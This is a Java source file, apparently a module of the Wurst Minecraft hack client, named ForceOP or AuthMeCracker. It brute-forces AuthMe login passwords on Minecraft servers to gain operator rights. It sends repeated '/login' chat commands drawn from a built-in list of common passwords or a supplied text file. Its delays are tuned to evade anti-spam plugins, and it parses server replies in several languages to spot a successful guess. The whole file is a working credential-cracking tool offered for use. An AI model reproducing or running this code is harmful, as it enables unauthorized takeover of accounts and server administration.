package tk.wurst_client.module.modules;

import java.awt.Desktop;
import java.awt.Dimension;
import java.awt.Font;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.net.URI;
import java.util.ArrayList;
import java.util.concurrent.TimeUnit;

import javax.swing.ButtonGroup;
import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JDialog;
import javax.swing.JFileChooser;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JRadioButton;
import javax.swing.JSeparator;
import javax.swing.JSpinner;
import javax.swing.SpinnerNumberModel;
import javax.swing.event.ChangeEvent;
import javax.swing.event.ChangeListener;
import javax.swing.filechooser.FileNameExtensionFilter;

import net.minecraft.client.Minecraft;
import tk.wurst_client.Client;
import tk.wurst_client.module.Category;
import tk.wurst_client.module.Module;

public class ForceOP extends Module
{
	public ForceOP()
	{
		super
		(
			"ForceOP",
			"Cracks AuthMe passwords. Can be used to get OP.\n"
			+ "If you want to know how to use this, press the\n"
			+ "\"How to use\" button. That will open an online\n"
			+ "tutorial where I explained how to use it.\n"
			+ "Don't message me on this!",
			0,
			Category.CHAT
		);
	}
	
	public String getName()
	{
		Client.Wurst.fileManager.loadValues();
		return Client.Wurst.options.renameForceOPEvenThoughTheNameIsTechnicallyCorrect ? "AuthMeCracker" : "ForceOP";
	}
	
	private String[] defaultList =
	{
			"password",
			"passwort",
			"password1",
			"passwort1",
			"password123",
			"passwort123",
			"pass",
			"pw",
			"pw1",
			"pw123",
			"hallo",
			"Wurst",
			"wurst",
			"1234",
			"12345",
			"123456",
			"1234567",
			"12345678",
			"123456789",
			"login",
			"register",
			"test",
			"sicher",
			"me",
			"penis",
			"penis1",
			"penis123",
			"minecraft",
			"minecraft1",
			"minecraft123",
			"mc",
			"admin",
			"server",
			"yourmom",
			"tester",
			"account",
			"creeper",
			"gronkh",
			"lol",
			"auth",
			"authme",
			"qwerty",
			"qwertz",
			"ficken",
			"ficken1",
			"ficken123",
			"fuck",
			"fuckme",
			"fuckyou",
	};
	private String[] passwords = {};
	
	private JDialog frame;
	private JLabel lPWList;
	private JRadioButton rbDefaultList;
	private JRadioButton rbTXTList;
	private JButton bTXTList;
	private JButton bHowTo;
	private JSeparator sepListSpeed;
	private JLabel lSpeed;
	private JLabel lDelay1;
	private JSpinner spDelay;
	private JLabel lDelay2;
	private JCheckBox cbDontWait;
	private JSeparator sepSpeedStart;
	private JLabel lName;
	private JLabel lPasswords;
	private JLabel lTime;
	private JButton bStart;
	
	private boolean gotWrongPWMSG;
	private int lastPW;
	private JLabel lAttempts;
	
	public void onEnable()
	{
		lastPW = -1;
		Client.Wurst.fileManager.loadValues();
		frame = new JDialog((JFrame)null, this.getName(), false);
		frame.setAlwaysOnTop(true);
		Dimension screen = Toolkit.getDefaultToolkit().getScreenSize();
		frame.setSize(512, 248);
		frame.setResizable(false);
		frame.setLocation((screen.width - frame.getWidth()) / 2, (screen.height - frame.getHeight()) / 2);
		frame.setLayout(null);
		frame.setDefaultCloseOperation(JDialog.DO_NOTHING_ON_CLOSE);
		frame.addWindowListener(new WindowAdapter()
		{
			public void windowClosing(WindowEvent e)
			{
				Client.Wurst.moduleManager.getModuleFromClass(ForceOP.class).setToggled(false);
			}
		});
		
		lPWList = new JLabel("Password list");
		lPWList.setLocation(4, 4);
		lPWList.setSize(lPWList.getPreferredSize());
		frame.add(lPWList);
		
		rbDefaultList = new JRadioButton("default", Client.Wurst.options.forceOPList.equals(Client.Wurst.fileManager.WurstDir.getPath()));
		rbDefaultList.setLocation(4, 24);
		rbDefaultList.setSize(rbDefaultList.getPreferredSize());
		frame.add(rbDefaultList);
		
		rbTXTList = new JRadioButton("TXT file", !rbDefaultList.isSelected());
		rbTXTList.setLocation(rbDefaultList.getX() + rbDefaultList.getWidth() + 4, 24);
		rbTXTList.setSize(rbTXTList.getPreferredSize());
		rbTXTList.addChangeListener(new ChangeListener()
		{
			@Override
			public void stateChanged(ChangeEvent e)
			{
				bTXTList.setEnabled(rbTXTList.isSelected());
				if(!rbTXTList.isSelected())
				{
					Client.Wurst.options.forceOPList = Client.Wurst.fileManager.WurstDir.getPath();
					Client.Wurst.fileManager.saveValues();
				}
				loadPWList();
				update();
			}
		});
		frame.add(rbTXTList);
		
		ButtonGroup bgList = new ButtonGroup();
		bgList.add(rbDefaultList);
		bgList.add(rbTXTList);
		
		bTXTList = new JButton("browse");
		bTXTList.setLocation(rbTXTList.getX() + rbTXTList.getWidth() + 4, 24);
		bTXTList.setSize(bTXTList.getPreferredSize());
		bTXTList.setEnabled(rbTXTList.isSelected());
		bTXTList.addActionListener(new ActionListener()
		{
			@Override
			public void actionPerformed(ActionEvent e)
			{
				JFileChooser fsTXTList = new JFileChooser();
				fsTXTList.setAcceptAllFileFilterUsed(false);
				fsTXTList.addChoosableFileFilter(new FileNameExtensionFilter("TXT files", new String[] {"txt"}));
				fsTXTList.setFileSelectionMode(JFileChooser.FILES_ONLY);
				fsTXTList.setCurrentDirectory(new File(Client.Wurst.options.forceOPList));
				int action = fsTXTList.showOpenDialog(frame);
				if(action == JFileChooser.APPROVE_OPTION)
				{
					if(!fsTXTList.getSelectedFile().exists())
						JOptionPane.showMessageDialog(frame, "File does not exist!", "Error", JOptionPane.ERROR_MESSAGE);
					else
					{
						Client.Wurst.options.forceOPList = fsTXTList.getSelectedFile().getPath();
						Client.Wurst.fileManager.saveValues();
					}
				}
				loadPWList();
				update();
			}
		});
		frame.add(bTXTList);
		
		bHowTo = new JButton("How to use");
		bHowTo.setFont(new Font(bHowTo.getFont().getName(), Font.BOLD, 16));
		bHowTo.setSize(bHowTo.getPreferredSize());
		bHowTo.setLocation(506 - bHowTo.getWidth() - 32, 12);
		bHowTo.addActionListener(new ActionListener()
		{
			@Override
			public void actionPerformed(ActionEvent e)
			{
				try
                {
                	String howToLink = "http://www.wurst-client.tk/wiki/tutorials/forceop";
                	Desktop.getDesktop().browse(new URI(howToLink));
                }catch(Throwable var5)
                {
                	var5.printStackTrace();
                }
			}
		});
		frame.add(bHowTo);
		
		sepListSpeed = new JSeparator();
		sepListSpeed.setLocation(4, 56);
		sepListSpeed.setSize(498, 4);
		frame.add(sepListSpeed);
		
		lSpeed = new JLabel("Speed");
		lSpeed.setLocation(4, 64);
		lSpeed.setSize(lSpeed.getPreferredSize());
		frame.add(lSpeed);
		
		lDelay1 = new JLabel("Delay between attempts:");
		lDelay1.setLocation(4, 84);
		lDelay1.setSize(lDelay1.getPreferredSize());
		frame.add(lDelay1);
		
		spDelay = new JSpinner();
		spDelay.setToolTipText
		(
			"<html>"
			+ "50ms: fastest, doesn't bypass AntiSpam plugins<br>"
			+ "1.000ms: recommended, bypasses most AntiSpam plugins<br>"
			+ "10.000ms: slowest, bypasses all AntiSpam plugins"
			+ "</html>"
		);
		spDelay.setModel(new SpinnerNumberModel(Client.Wurst.options.forceOPDelay, 50, 10000, 50));
		spDelay.setLocation(lDelay1.getX() + lDelay1.getWidth() + 4, 84);
		spDelay.setSize(60, (int) spDelay.getPreferredSize().getHeight());
		spDelay.addChangeListener(new ChangeListener()
		{
			@Override
			public void stateChanged(ChangeEvent e)
			{
				Client.Wurst.options.forceOPDelay = (Integer) spDelay.getValue();
				Client.Wurst.fileManager.saveValues();
				update();
			}
		});
		frame.add(spDelay);
		
		lDelay2 = new JLabel("ms");
		lDelay2.setLocation(spDelay.getX() + spDelay.getWidth() + 4, 84);
		lDelay2.setSize(lDelay2.getPreferredSize());
		frame.add(lDelay2);
		
		cbDontWait = new JCheckBox("<html>Don't wait for \"<span style=\"color: rgb(192, 0, 0);\"><b>Wrong password!</b></span>\" messages</html>", Client.Wurst.options.forceOPDontWait);
		cbDontWait.setToolTipText("Increases the speed but can cause inaccuracy.");
		cbDontWait.setLocation(4, 104);
		cbDontWait.setSize(cbDontWait.getPreferredSize());
		cbDontWait.addActionListener(new ActionListener()
		{
			@Override
			public void actionPerformed(ActionEvent e)
			{
				Client.Wurst.options.forceOPDontWait = cbDontWait.isSelected();
				Client.Wurst.fileManager.saveValues();
				update();
			}
		});
		frame.add(cbDontWait);
		
		sepSpeedStart = new JSeparator();
		sepSpeedStart.setLocation(4, 132);
		sepSpeedStart.setSize(498, 4);
		frame.add(sepSpeedStart);
		
		lName = new JLabel("Username: " + Minecraft.getMinecraft().session.getUsername());
		lName.setLocation(4, 140);
		lName.setSize(lName.getPreferredSize());
		frame.add(lName);
		
		lPasswords = new JLabel("Passwords: error");
		lPasswords.setLocation(4, 160);
		lPasswords.setSize(lPasswords.getPreferredSize());
		frame.add(lPasswords);
		
		lTime = new JLabel("Estimated time: error");
		lTime.setLocation(4, 180);
		lTime.setSize(lTime.getPreferredSize());
		frame.add(lTime);
		
		lAttempts = new JLabel("Attempts: error");
		lAttempts.setLocation(4, 200);
		lAttempts.setSize(lAttempts.getPreferredSize());
		frame.add(lAttempts);
		
		bStart = new JButton("Start");
		bStart.setFont(new Font(bHowTo.getFont().getName(), Font.BOLD, 18));
		bStart.setLocation(506 - 192 - 12, 144);
		bStart.setSize(192, 66);
		bStart.addActionListener(new ActionListener()
		{
			@Override
			public void actionPerformed(ActionEvent e)
			{
				lPWList.setEnabled(false);
				rbDefaultList.setEnabled(false);
				rbTXTList.setEnabled(false);
				bTXTList.setEnabled(false);
				bHowTo.setEnabled(false);
				sepListSpeed.setEnabled(false);
				lSpeed.setEnabled(false);
				lDelay1.setEnabled(false);
				spDelay.setEnabled(false);
				lDelay2.setEnabled(false);
				cbDontWait.setEnabled(false);
				sepSpeedStart.setEnabled(false);
				lName.setEnabled(false);
				lPasswords.setEnabled(false);
				bStart.setEnabled(false);
				new Thread(new Runnable()
				{
					@Override
					public void run()
					{
						Minecraft.getMinecraft().thePlayer.sendChatMessage("/login " + Minecraft.getMinecraft().session.getUsername());
						lastPW = 0;
						loadPWList();
						update();
						for(int i = 0; i < passwords.length; i++)
						{
							if(!Client.Wurst.moduleManager.getModuleFromClass(ForceOP.class).getToggled())
								return;
							if(!cbDontWait.isSelected())
								gotWrongPWMSG = false;
							while((!cbDontWait.isSelected() && !hasGotWrongPWMSG()) || Minecraft.getMinecraft().thePlayer == null)
							{
								if(!Client.Wurst.moduleManager.getModuleFromClass(ForceOP.class).getToggled())
									return;
								try
								{
									Thread.sleep(50);
								}catch(InterruptedException e)
								{
									e.printStackTrace();
								}
								if(Minecraft.getMinecraft().thePlayer == null)
									gotWrongPWMSG = true;//If you get kicked, it won't wait for "Wrong password!".
							}
							try
							{
								Thread.sleep(Client.Wurst.options.forceOPDelay);
							} catch (InterruptedException e)
							{
								e.printStackTrace();
							}
							boolean sent = false;
							while(!sent)
							{
								try
								{
									Minecraft.getMinecraft().thePlayer.sendChatMessage("/login " + passwords[i]);
									sent = true;
								}catch(Exception e)
								{
									try
									{
										Thread.sleep(50);
									}catch(InterruptedException e1)
									{
										e1.printStackTrace();
									}
								}
							}
							lastPW = i + 1;
							update();
						}
						Client.Wurst.chat.failure("Tried " + (lastPW + 1) + " passwords. Giving up.");
					}
				}, "AuthMeCracker").start();
			}
		});
		frame.add(bStart);
		
		loadPWList();
		update();
		Minecraft.getMinecraft().setIngameNotInFocus();
		frame.setVisible(true);
		frame.toFront();
	}
	
	private void loadPWList()
	{
		if(rbTXTList.isSelected() && !Client.Wurst.options.forceOPList.equals(Client.Wurst.fileManager.WurstDir.getPath()))
		{
			try
			{
				File pwList = new File(Client.Wurst.options.forceOPList);
				BufferedReader load = new BufferedReader(new FileReader(pwList));
				ArrayList<String> loadedPWs = new ArrayList<String>();
				for(String line = ""; (line = load.readLine()) != null;)
				{
					loadedPWs.add(line);
				}
				load.close();
				passwords = loadedPWs.toArray(new String[loadedPWs.size()]);
			}catch(IOException e)
			{
				e.printStackTrace();
				JOptionPane.showMessageDialog(frame, "Error: " + e.getMessage(), "Error", JOptionPane.ERROR_MESSAGE);
				return;
			}
		}else
			passwords = defaultList;
		lPasswords.setText("Passwords: " + (passwords.length + 1));
		lPasswords.setSize(lPasswords.getPreferredSize());
	}
	
	private void update()
	{
		long timeMS = (passwords.length + 1 - lastPW) * (Integer) spDelay.getValue();
		timeMS = timeMS + (int)(timeMS / 30000 * 5000);
		if(!cbDontWait.isSelected())
			timeMS = timeMS + (timeMS / (Integer) spDelay.getValue() * 50);
		String timeString =
			TimeUnit.MILLISECONDS.toDays(timeMS)
			+ "d "
			+ (TimeUnit.MILLISECONDS.toHours(timeMS) - TimeUnit.DAYS.toHours(TimeUnit.MILLISECONDS.toDays(timeMS)))
			+ "h "
			+ (TimeUnit.MILLISECONDS.toMinutes(timeMS) - TimeUnit.HOURS.toMinutes(TimeUnit.MILLISECONDS.toHours(timeMS)))
			+ "m "
			+ (TimeUnit.MILLISECONDS.toSeconds(timeMS) - TimeUnit.MINUTES.toSeconds(TimeUnit.MILLISECONDS.toMinutes(timeMS)))
			+ "s"
		;
		lTime.setText("Estimated time: " + timeString);
		lTime.setSize(lTime.getPreferredSize());
		lAttempts.setText("Attempts: " + (lastPW + 1) + "/" + (passwords.length + 1));
		lAttempts.setSize(lAttempts.getPreferredSize());
	}
	
	public void onReceivedMessage(String message)
	{
		if(!this.getToggled() || message.startsWith("§c[§6" + Client.Wurst.CLIENT_NAME + "§c]§f "))
			return;
		if
		(
			message.toLowerCase().contains("wrong")//English
			|| message.toLowerCase().contains("falsch")//Deutsch!
			|| message.toLowerCase().contains("incorrect")//English
			|| message.toLowerCase().contains("mauvais")//French
			|| message.toLowerCase().contains("mal")//Spanish
			|| message.toLowerCase().contains("sbagliato")//Italian
		)
		{
			gotWrongPWMSG = true;
		}else if
		(
			message.toLowerCase().contains("success")//English & Italian
			|| message.toLowerCase().contains("erfolg")//Deutsch!
			|| message.toLowerCase().contains("succès")//French
			|| message.toLowerCase().contains("éxito")//Spanish
		)
		{
			String password;
			if(lastPW == -1)
				return;
			else if(lastPW == 0)
				password = Minecraft.getMinecraft().session.getUsername();
			else
				password = passwords[lastPW - 1];
			Client.Wurst.chat.success("The password \"" + password + "\" worked.");
			this.setToggled(false);
		}else if
		(
			message.toLowerCase().contains("/help")
			|| message.toLowerCase().contains("permission")
		)
		{
			Client.Wurst.chat.warning("It looks like this server doesn't have AuthMe.");
		}else if
		(
			message.toLowerCase().contains("logged in")
			|| message.toLowerCase().contains("eingeloggt")
			|| message.toLowerCase().contains("eingelogt")
		)
		{
			Client.Wurst.chat.warning("It looks like you are already logged in.");
		}
	}
	
	private boolean hasGotWrongPWMSG()
	{
		return gotWrongPWMSG;
	}
	
	public void onDisable()
	{
		frame.dispose();
	}
}
